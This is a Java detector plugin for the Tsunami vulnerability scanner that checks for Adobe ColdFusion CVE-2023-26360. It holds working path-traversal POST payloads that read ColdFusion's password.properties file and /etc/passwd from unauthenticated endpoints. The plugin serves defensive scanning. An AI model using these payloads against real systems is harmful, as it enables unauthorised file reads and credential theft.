/*
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202326360;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.data.NetworkServiceUtils.buildWebApplicationRootUrl;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Pattern;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2023-26360. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Cve202326360VulnDetector",
    version = "1.0",
    description = "This detector checks for Adobe ColdFusion CVE-2023-26360 vulnerability",
    author = "jimmy-ly00",
    bootstrapModule = Cve202326360DetectorBootstrapModule.class)
public final class Cve202326360Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final ImmutableList<String> VULNERABLE_REQUEST_PATHS =
      ImmutableList.of(
          "cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx",
          "CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx");

  /** Windows */
  private static final String VULNERABLE_REQUEST_BODY_WINDOWS =
      "_variables={\"_metadata\":{\"classname\":\"i/../lib/password.properties\"},\"_variables\":[]}";

  /** Linux */
  private static final String VULNERABLE_REQUEST_BODY_LINUX =
      "_variables={\"_metadata\":{\"classname\":\"../../../../../../../../etc/passwd\"}}";

  private static final ImmutableList<String> VULNERABLE_REQUEST_BODY_ALL =
      ImmutableList.of(VULNERABLE_REQUEST_BODY_WINDOWS, VULNERABLE_REQUEST_BODY_LINUX);

  private static final Pattern VULNERABLE_RESPONSE_PATTERN =
      Pattern.compile("password=|root:[x*]:0:0:");

  private final HttpClient httpClient;
  private final Clock utcClock;

  @Inject
  Cve202326360Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2023-26360 starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    for (String path : VULNERABLE_REQUEST_PATHS) {
      for (String payload : VULNERABLE_REQUEST_BODY_ALL) {
        String targetUrl = buildWebApplicationRootUrl(networkService) + path;
        try {
          HttpResponse response =
              httpClient.send(
                  post(targetUrl)
                      .setHeaders(
                          HttpHeaders.builder()
                              .addHeader(CONTENT_TYPE, "application/x-www-form-urlencoded")
                              .build())
                      .setRequestBody(ByteString.copyFromUtf8(payload))
                      .build(),
                  networkService);
          if (response.bodyString().isPresent()) {
            if (VULNERABLE_RESPONSE_PATTERN.matcher(response.bodyString().get()).find()) {
              return true;
            }
          }
        } catch (Exception e) {
          logger.atWarning().withCause(e).log("Failed request to target %s.", networkService);
        }
      }
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2023_26360"))
                .addRelatedId(
                    VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2023-26360"))
                .setSeverity(Severity.CRITICAL)
                .setTitle(
                    "Adobe ColdFusion Unauthenticated Arbitrary Read and Remote Code Execution")
                .setDescription(
                    "Adobe ColdFusion versions 2018 Update 15 (and earlier) and 2021 Update 5 (and"
                        + " earlier) are affected by an Improper Access Control vulnerability that"
                        + " could result in unauthenticated file read and arbitrary code execution"
                        + " in the context of the current user. Exploitation of this issue does not"
                        + " require user interaction.")
                .setRecommendation(
                    "For Adobe ColdFusion 2018, ugrade to version Update 16 or higher"
                        + "For  Adobe ColdFusion 2021, upgrade to version Update 6 or higher"))
        .build();
  }
}
